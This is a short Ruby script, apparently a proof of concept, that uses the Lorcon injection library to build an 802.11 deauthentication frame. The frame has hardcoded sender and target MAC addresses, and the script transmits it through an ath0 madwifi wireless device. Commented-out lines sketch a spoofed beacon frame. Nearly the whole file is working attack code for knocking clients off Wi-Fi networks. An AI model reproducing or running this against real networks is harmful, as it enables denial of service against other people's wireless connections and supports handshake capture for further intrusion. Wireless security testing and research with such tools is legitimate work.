$: << "." << "new_order"
require "Lorcon"
require "new_order/dot11"

#00:19:d2:52:ba:f8

$my_mac_addr      = "00:0b:86:80:e4:e0"
$remote_mac_addr  = "00:0e:3b:08:83:06"

header = Dot11.new(:subtype => 12, :type => 0, :fc => 0, :addr1 => $remote_mac_addr, 
                   :addr2 => $my_mac_addr, :addr3 => $my_mac_addr, 
                   :sc => 0x1f0)
deauth = Dot11Deauth.new(:reason => 100)

#beacon = Dot11Beacon.new(:timestamp => 0x000002B69AF8433B, :beacon_interval => 0x0064, :capabilities => 0x2100)
#ssid = Dot11Elt.new(:id => 0, :info_length => 35, :info => "daniel peebles loves the mush room!")
#rates = Dot11Elt.new(:id => 1, :info_length => 4, :info => "#{0x82.chr}#{0x84.chr}#{0x0b.chr}#{0x16.chr}")
#ds = Dot11Elt.new(:id => 3, :info_length => 1, :info => 0x0b.chr)

packet = header/deauth

for i in 0..0
  packet.frame.reason = i
  data = packet.data

  data.each_byte do |byte|
    print byte.to_s(16), " "
  end
  puts ""

  device = Lorcon::Device.new("ath0", "madwifing", 11)
  device.write data, 3, 0
end

puts "Sent!"

